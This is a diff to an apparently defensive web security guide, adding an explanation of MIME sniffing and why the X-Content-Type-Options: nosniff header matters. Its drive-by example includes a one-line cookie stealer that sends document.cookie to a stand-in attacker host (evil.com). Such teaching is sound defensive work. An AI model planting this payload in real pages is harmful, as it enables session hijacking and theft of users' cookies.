@@ -154,7 +154,65 @@ When set to `nosniff`, this header instructs browsers to strictly follow the `Co
 X-Content-Type-Options: nosniff
 ```
 
-+Best Practice+: Always use this header, especially when serving user-uploaded files or dynamic content—to reduce the risk of drive-by downloads or cross-site scripting via unexpected file interpretation.
+
+#### What Is MIME Sniffing? {#what-is-mime-sniffing}
+
+Browsers try to be "helpful" by sniffing the actual content of a file to determine its type, even if the server explicitly tells the browser, "Hey this is a text file."
+
+For example, if a server sends a file with `Content-Type: text/plain`, but the browser detects JavaScript content, some browsers might treat it as `application/javascript` and execute it.
+
+This is where the `X-Content-Type-Options: nosniff` header comes in. It tells the browser: "Don’t guess. Only trust the `Content-Type` that I, the server, tells you."
+
+
+#### An Example Exploit Scenario (Without `nosniff` enabled): {#an-example-exploit-scenario--without-nosniff-enabled}
+
+Say you have a website, that you allow users to upload images to like `.png`, `.jpg` etc. Now, say someone uploads a malicious JavaScript file but renames it to `profile.png` and your backend accepts the file and serves it with a generic or incorrect MIME type `Content-Type: image/png`
+
+However, as this file actually contains JavaScript what happens if `X-Content-Type-Options` is missing?
+
+Well some browsers might inspect the content of `profile.png` and **sniff** that it’s actually JavaScript, and if the file is embedded or linked in a way that allows script execution through a `<script src="...">` etc, the browser may **execute the script**.
+
+This could lead to:
+
+-   **Cross-site scripting (XSS)** if the malicious file is embedded in a page.
+-   **Session hijacking**, **cookie theft**, or **CSRF** attacks.
+-   **Drive-by downloads**, where a user is tricked into downloading and running malicious code just by visiting a URL.
+
+
+#### An Example of Drive-by Scenario (Without `nosniff` enabled): {#an-example-of-drive-by-scenario--without-nosniff-enabled}
+
+Suppose you have a document-sharing feature and host files at: <https://example.com/files/user-uploaded.pdf> but an attacker uploads a malicious file disguised as a PDF named `invoice.pdf`. And your webserver serves it as `Content-Type: application/pdf`
+
+But its actual content is a cookie stealer like below.
+
+```js
+  <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
+```
+
+If `X-Content-Type-Options` is **missing**, and the user visits:
+
+```cfg
+<iframe src="https://example.com/files/invoice.pdf"></iframe>
+```
+
+Some browsers may sniff the file and execute the script, turning a benign file-hosting service into a drive-by attack vector allowing attackers to steal cookies without any interaction.
+
+
+#### Best Practice: {#best-practice}
+
+Always use this header, especially when serving user uploaded files or dynamic content to reduce the risk of drive-by downloads or cross-site scripting via unexpected file interpretation.
+
+```cfg
+X-Content-Type-Options: nosniff
+```
+
+This will ensure browsers do **not override the declared MIME type** that is provided by the web server &amp; prevent the browser from accidentally executing files as scripts.
+
+It can help protect against:
+
+-   XSS from mislabeled files
+-   Drive-by downloads
+-   Content spoofing
 
 
 ### Content-Security-Policy (CSP): {#content-security-policy--csp}
@@ -648,7 +706,7 @@ Talisman(app,
 ```
 
 
-## Testing and Validation: {#testing-and-validation}
+## Testing and Validation {#testing-and-validation}
 
 
 ### Manual Testing: {#manual-testing}
